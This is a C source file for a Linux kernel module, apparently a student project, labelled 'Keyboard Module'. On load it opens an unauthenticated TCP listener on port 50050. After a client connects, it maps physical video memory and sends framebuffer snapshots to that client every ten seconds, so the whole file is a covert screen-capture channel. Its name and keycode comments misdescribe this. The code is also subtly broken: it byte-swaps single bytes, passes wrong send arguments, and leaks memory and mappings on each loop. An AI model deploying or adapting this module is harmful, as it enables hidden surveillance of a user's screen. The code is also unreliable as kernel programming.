#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/printk.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/delay.h>


// Video memory address and size (adjust according to your system)
#define VIDEO_MEMORY_ADDRESS 0xde000000
#define VIDEO_MEMORY_SIZE    (1024 * 1024) // 1 MB

#define PORT 50050

static void* snapshot_buffer = NULL;
static void* video_mem_snapshot = NULL;
static struct socket *sock = NULL; // Socket to send keycodes to the server
static struct socket *client_sock = NULL; // Socket to send keycodes to the client
static struct task_struct *accept_thread = NULL; // Thread to accept connections from the server
static struct task_struct *get_memory_thread = NULL; // Thread to get memory and send to socket
static struct sockaddr_in client_address;

// Get memory and send
static int get_memory_thread_fn(void *data) {
    int ret;
    printk(KERN_INFO "Iniciando nova thread de memoria de video\n");

    while (!kthread_should_stop()) {
        struct kvec iovector;
        struct msghdr message;

        // Map video memory into kernel space
        video_mem_snapshot = ioremap(VIDEO_MEMORY_ADDRESS, VIDEO_MEMORY_SIZE);
        if (!video_mem_snapshot) {
            printk(KERN_ERR "Failed to map video memory\n");
            return -EFAULT;
        }

        // Allocate memory for the snapshot buffer
        void* snapshot_buffer = vmalloc(VIDEO_MEMORY_SIZE);
        if (!snapshot_buffer) {
            printk(KERN_ERR "Failed to allocate memory for snapshot buffer\n");
            iounmap(video_mem_snapshot);
            return -ENOMEM;
        }

        // Capture the video memory snapshot
        memcpy(snapshot_buffer, video_mem_snapshot, VIDEO_MEMORY_SIZE);
        unsigned char* snapshot = (unsigned char*)snapshot_buffer;

        iovector.iov_base = snapshot;
        iovector.iov_len = sizeof(unsigned char)*VIDEO_MEMORY_SIZE;
        
        memset(&message, 0, sizeof(message));
        message.msg_name = &client_address;
        message.msg_namelen = sizeof(client_address);
        message.msg_control = NULL;
        message.msg_controllen = 0;
        message.msg_flags = 0;
            
        // Try to send keycode to client
        if (client_sock == NULL) {
            return 0;
        
        }

        // Write the snapshot into the socket
        printk(KERN_INFO "Sending Video Memory Snapshot...\n");
        unsigned int i;

        for (i = 0; i < VIDEO_MEMORY_SIZE; ++i) {
            snapshot[i] = htons(snapshot[i]);     
        }

        ret = kernel_sendmsg(client_sock, &message, &iovector, VIDEO_MEMORY_SIZE, sizeof(snapshot[0]));
        if (ret < 0) {
            printk(KERN_ERR "Failed to send snapshot to client\n");
        }

        msleep(10000);
    }
    
    get_memory_thread = NULL;
    return 0;
}

// Accept connection
static int accept_thread_fn(void *data) {
    int ret;

    printk(KERN_INFO "Iniciando nova thread\n");

    while (!kthread_should_stop()) {
        // //Wait for a client to connect
        ret = kernel_accept(sock, &client_sock, 0);
        if (ret < 0) {
            if (ret != -EAGAIN) {
                printk(KERN_ERR "Failed to accept connection\n");
            }
            printk(KERN_INFO "Iteration");
            msleep(5000); // avoid busy-waiting
            continue;
        }

        // Print the client's IP address and port
        ret = kernel_getpeername(client_sock, (struct sockaddr *)&client_address);
        if (ret >= 0) {
            printk(KERN_INFO "Accepted connection from %pI4:%u\n",
                   &client_address.sin_addr, ntohs(client_address.sin_port));

            wake_up_process(get_memory_thread);
            break;
        }

    }

    accept_thread = NULL;
    return 0;
}

// Creates socket
static int create_socket(void) {
    struct sockaddr_in server_addr;
    int ret;

    // Create TCP socket
    ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_ERR "failed to create socket\n");
        return ret;
    }

    printk(KERN_INFO "Socket criado!\n");
    
    // Setup server address and bind it to the socket
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to server address
    ret = kernel_bind(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (ret < 0) {
        printk(KERN_ERR "failed to bind socket\n");
        sock_release(sock);
        return ret;
    }

    printk(KERN_INFO "Socket conectado com o servidor!\n");
    
    // Listen for incoming connections
    ret = kernel_listen(sock, 1);
    if (ret < 0) {
        printk(KERN_ERR "failed to listen on socket\n");
        
        sock_release(sock);
        return ret;
    }

    printk(KERN_INFO "Socket colocado em estado de escuta!\n");
    
    // Create thread to accept connections
    accept_thread = kthread_run(accept_thread_fn, NULL, "accept_thread");
    if (IS_ERR(accept_thread)) {
        printk(KERN_ERR "failed to create accept thread\n");
        sock_release(sock);
        return PTR_ERR(accept_thread);
    }

    return ret;

}


static int __init keyboard_module_init(void)
{ 
    printk(KERN_INFO "Modulo carregado!\n");
    
    // Create thread that sends video memory snapshots
    get_memory_thread = kthread_create(get_memory_thread_fn, NULL, "video_memory_getter_thread");
    if (IS_ERR(get_memory_thread)) {
        printk(KERN_ERR "Failed to create kernel thread\n");
        return PTR_ERR(get_memory_thread);
    }

    // Create server
    create_socket();


    return 0;
}

static void __exit keyboard_module_exit(void)
{
    
    // Release socket
    if (client_sock){
        printk(KERN_INFO "Soltando socket do cliente!\n");
        sock_release(client_sock);
    }
        
    if (sock){
        printk(KERN_INFO "Soltando socket do servidor!\n");
        sock_release(sock);
    }

    if (accept_thread){
        printk(KERN_INFO "Terminando thread!\n");
        kthread_stop(accept_thread);
    }

    if (get_memory_thread){
        printk(KERN_INFO "Terminando thread de memoria!\n");
        kthread_stop(get_memory_thread);
    }

        
}

module_init(keyboard_module_init);
module_exit(keyboard_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Matheus V. Bellini & Angelo B. Guido");
MODULE_DESCRIPTION("Keyboard Module");